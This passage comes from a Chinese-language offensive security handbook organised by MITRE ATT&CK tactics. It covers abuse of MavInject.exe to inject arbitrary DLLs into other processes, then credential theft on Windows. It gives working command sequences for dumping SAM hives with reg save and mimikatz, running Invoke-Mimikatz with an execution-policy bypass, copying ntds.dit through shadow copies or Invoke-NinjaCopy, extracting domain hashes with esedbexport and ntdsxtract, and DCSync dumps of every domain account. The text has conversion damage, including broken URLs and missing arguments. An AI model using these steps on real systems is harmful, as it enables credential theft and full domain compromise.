> 实例的PID，其路径与在"事件"期间注入的DLL
> 的路径相对应。"mav-inject"的名字应该已经相当透露了，在这一点上，我们怀疑它可能被用来（和滥用）在任何其他进程中注入任意的恶意DLL。作为第一步，我们尝试了解Mavinject
> 是否是共同的组件; 我们在以下位置的不同端点上找到它： \"C:\\Program
> Files\\Common Files\\microsoft
> shared\\ClickToRun\\MavInject32.exe\"此外，可执行文件可以在其他两个目录中找到：System32
> 和SysWOW64。文件描述显示组件是什么： FileDescription: Microsoft
> Application Virtualization Injector 该应用程序是Microsoft Application
> Virtualization（App-V）的一部分。可执行文件的分析使我们得到以下有趣的参数
>
> /INJECTRUNNING
>
> ![](media/image245.jpeg){width="5.414140419947507in"
> height="1.7525251531058619in"} 使用Mavinject ...
> 在收集到来自不同客户的更多信息之后，我们确定了一个常见的用例：
> mavinject \ /INJECTRUNNING 使用此命令行运行的可执行文件查找以下
> 注 册 表 项 ：
> Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\AppV\\Subsystem
> 其相应的值是： ValueName: Modules - ValueData:
>
> C:\\Windows\\System32\\AppVEntSubsystems32.dllValueName: Modules64 -
> ValueData: C:\\Windows\\System32\\AppVEntSubsystems64.dll
> 根据目标进程体系结构（32 位或 64
> 位），它会注入其中一个DLL。虐待Mavinject ...
> 经过进一步分析，很明显的是，同样的确切机制可以被滥用以下方式注入一个DLL
> 在一个任意的运行过程中： MavInject.exe \ /INJECTRUNNING \
> DLL\>
>
> ![](media/image246.png){width="5.833333333333333in"
> height="3.643332239720035in"}参
考资料 ：dll
https://gist.github.com/anonymous/b25cb82c4b3d40648f0b589fa242577f
![](media/image247.jpeg){width="5.807376421697287in" height="3.5425in"}
https://reaqta.com/2017/12/mavinject-microsoft-injector/
从假阳性到真阳性：微软注射器Mavinject.exe
的故事https://twitter.com/subTee/status/942779279623913473
视频内容
：https://[www.ggsec.cn/mavinject.html](http://www.ggsec.cn/mavinject.html)
# 六.[Credential Access](https://attack.mitre.org/tactics/TA0006/)
攻击者窃取用户名和密码。 凭证访问包括窃取用户和密码等凭据的技术。
## 目录：
6.  账户操作
    1.  Windows
        1.  暴力破解
        2.  凭证转储
        3.  组策略首选项（GPP）文件
        4.  文件中的凭据
        5.  注册表中的凭据
        6.  键盘记录
        7.  Kerberos
        8.  Kerberoast
        9.  嗅探
        10. 密码过滤
    2.  Linux
        1.  Bash History
        2.  密码转储
        3.  私钥
        4.  网络嗅探描述
        5.  文件中的凭据描述
        ```{=html}
        ```
        1.  ## 暴力破解
当攻击这不知道密码或者已经获取到HASH 时，可以通暴力破解或破解HASH
的方式来尝试访问。 当获取到该用户的HASH
时攻击者可以通过预先计算好的彩虹表或者在线破解平台来进行破解。也可以通过传递哈希（PTH）来进行身份验证。当攻击者不知道密码的情况下可以使用暴力破解的方式来进行获取。这个方式是一个高风险的方式，可能会导致大量的身份验证失败和账户锁定。
还可以通过密码
喷涂的方式来进行尝试。 https://doubleoctopus.com/security-wiki/threats-
and-tools/password-spraying/ https://blog.stealthbits.com/using-
stealthdefend-to-defend-against-password-spraying/
https://searchsecurity.techtarget.com/answer/What-is-a-password-
spraying-attack-and-how-does-it-work
通常使用密码喷涂可以在一下端口的来进行尝试：
-   SSH（22 / TCP）
-   Telnet（23 / TCP）
-   FTP（21 / TCP）
-   NetBIOS / SMB / Samba（139 / TCP 和 445 / TCP）
-   LDAP（389 / TCP）
-   Kerberos（88 / TCP）
-   RDP /终端服务（3389 / TCP）
-   HTTP(S) / HTTP 管理服务（80 / TCP 和 443 / TCP）
-   MSSQL（1433 / TCP）
-   Oracle（1521 / TCP）
-   MySQL（3306 / TCP）
-   VNC（5900 / TCP）
    1.  ## 凭证转储
凭证转储是从操作系统和软件获取账户登录和密码信息的过程，通常以HASH
和明文密码的形式。然后可以使用所获取的到凭据来进行横行移动。
####### SAM 文件获取
> SAM 是一个数据库文件，其中包含主机的本地账户信息，通常是使用net user
> 命令能查找到的用户。要枚举SAM
> 数据库需要进行系统级的访问，可以通过以下方式来获取到SAM 文件：
-   reg save hklm\\sam sam.hive
-   reg save hklm\\system system.hive
> ![](media/image248.jpeg){width="5.873092738407699in"
> height="1.723332239720035in"}
>
> 然后通过mimikatz 来获取HASH： lsadump::sam /sam:sam.hive
>
> /system:system.hive
>
> ![](media/image249.jpeg){width="5.745663823272091in"
> height="2.9696872265966756in"}
>
> 也可以将上述文件下载到本地，使用Creddump7 在本地处理SAM
> 数据库以检索哈希值，或者cain 来获取。
####### mimikatz
既能导出域凭据（Domain Credentials）的明文，也能导出通用凭据（Generic
Credentials）的明文，但是无法导出IE
浏览器存储的明文。https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Ex
filtration/Invoke-Mimikatz.ps1 powershell -exec bypass \"import-
> module .\\Invoke-Mimikatz.ps1;Invoke-Mimikatz\"
![](media/image250.jpeg){width="5.829586614173229in"
height="6.808957786526684in"}
####### vaultcmd 命令（Win 自带）导出的不是明文密码
vaultcmd /list ---\>列出保管库 vaultcmd /listschema
---\>列出保管库的概要， 凭据名称和GUID GUID
对应的路径为%localappdata%/Microsoft\\Vault{GUID} 下的文件
![](media/image251.jpeg){width="5.799589895013123in" height="5.8725in"}
####### 获取 NTDS 文件
> Active Directory
> 存储有关域成员的信息，包括用于验证凭据和定义访问控制权限的设备和用户。Active
> Directory 域数据库存储在NTDS.dit 中。默认情况下， NTDS
> 文件将位于域控制器的%SystemRoot%\\NTDS\\Ntds.dit 中。可以通过以下工
具和枚举NTDS 文件和整个Active Directory 哈希的内容。通过VSS
卷影复制的方式获取NTDS.dit
1\. 通过ntdsutil.exe 提取
-   使用ntdsutil.exe 创建快照
> ![](media/image252.jpeg){width="5.870966754155731in" height="1.04in"}
-   将创建好的快照挂载到系统中
> ![](media/image253.jpeg){width="5.8626465441819775in"
> height="0.6666666666666666in"}
-   将快照文件复制出来
> ![](media/image254.jpeg){width="5.801801181102363in"
> height="0.30666557305336833in"}
-   删除已挂载的快照
> ![](media/image255.jpeg){width="5.843477690288714in" height="0.96in"}
>
> 1\. 使 用 Invoke-NinjaCopy 导 出 ntds.dit 文 件
> https://github.com/Veil- Framework/Veil-
> Pillage/blob/af7907fad0c7ffdd0eaa282044e3b629ecdebc99/data/Pow
> erSploit/Invoke-NinjaCopy.ps1 Invoke-NinjaCopy -Path
> \"c:\\windows\\ntds\\ntds.dit\" -LocalDestination
> \"c:\\windows\\temp\\ntds.dit\"
>
> ![](media/image256.jpeg){width="5.855179352580928in"
> height="0.6875in"}
更多方式https://pentestlab.blog/2018/07/04/dumping-domain-password-
hashes/
####### 导出 ntds.dit 中的 HASH
> 将已经复制的ntds.dit 文件拖本地使用以下方法进行获取：
1.  使 用 esedbexport 获 取 ， 在 Kali 下 安 装 libesedb wget
    https://github.com/libyal/libesedb/releases/download/20181229/libesedb-
    experimental-20181229.tar.gz
> ![](media/image257.jpeg){width="5.897222222222222in" height="0.88in"}
2.  解压完并安装依赖环境 tar -zxvf libesedb-experimental-20181229.tar.gz
    apt- get install autoconf automake autopoint libtool pkg-config
> ![](media/image258.jpeg){width="5.880181539807524in"
> height="2.039582239720035in"}
3.  将工具进行编译安装 ./configure make make install ldconfig
4.  成功安装后会在/usr/local/bin/可以看到
> ![](media/image259.jpeg){width="5.88625656167979in"
> height="0.4170833333333333in"}
5.  将所得到ntds.dit
    拷进Kali，使用该工具进行获取（时间长短取决于文件大小）。
    /usr/local/bin/esedbexport -m tables ntds.dit
> esedbexport 20181229
>
> ![](media/image260.jpeg){width="5.880479002624672in"
> height="3.06625in"}
6.  获取到如下图所示
> ![](media/image261.jpeg){width="5.874841426071741in"
> height="0.8845833333333334in"}
7.  安 装 ntdsxtract 来 提 取 域 中 的 信 息 git clone
    https://github.com/csababarta/ntdsxtract.git cd ntdsxtract/ python
    setup.py build && python setup.py install
8.  提取用户信息及密码，将ntds.dit 和SYSTEM.hiv 放到ntdsxtract
    同一目录中 。 执 行 如 下 ： dsusers.py ntds.dit.export/datatable.4
    ntds.dit.export/link_table.6 output \--syshive system.hive
    \--passwordhasher \-- pwdformat ocl \--ntoutfile ntout \--lmoutfile
    lmout \|tee 1.txt
> ![](media/image262.jpeg){width="5.744139326334208in"
> height="1.455728346456693in"}
9.  成功导出用户信息和hash。
> ![](media/image263.jpeg){width="5.820121391076116in"
> height="3.2978116797900263in"}
####### DCSync
DCSync
是凭证转存的变体，可用于从域控制器获取名感信息。该操作不是执行可识别的恶意代码，而是通过滥用域控制器的应用程序编程接口（API）来模拟来自域控制器的复制过程。域控制器上的管理员、域管理员、企业管理员或计算机账户的任何成员都能够运行DCSync
从Active Directory 中提取密码数据。可以通过所获取到的HASH
来创建用于金票通过票证或者更改账户操作中记录的密码。 参考 资 料 ：
https://adsecurity.org/?p=1729 https://wiki.samba.org/index.php/DRSUAPI
https://docs.microsoft.com/en-
us/openspecs/windowsprotocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-
af7336e4792fhttps://docs.microsoft.com/en-
us/openspecs/windowsprotocols/ms-drsr/b63730ac-614c-431c-9501-
28d6aca91894 https://docs.microsoft.com/en-
us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-
48c640241d47 
dcsync-and-extrasids-oh-my/
https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump
https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97
%E9%80%8F-DCSync/
-   通过Mimikatz 获取 DCSync 功能已经包含在Mimikatz 的Lsadump
    模块中。Lsadump 还包括了NetSync，它是通过传统的复制协议来执行DCSync
    导出域内所有用户的哈希： lsadump::dcsync /domain:test.com /all /csv
> ![](media/image264.jpeg){width="5.880526027996501in"
> height="3.167082239720035in"}
>
> 导出域内管理员账户的哈希： lsadump::dcsync /domain:test.com
>
> /user:administrator /csv
>
> ![](media/image265.jpeg){width="5.885416666666667in"
> height="0.5179166666666667in"}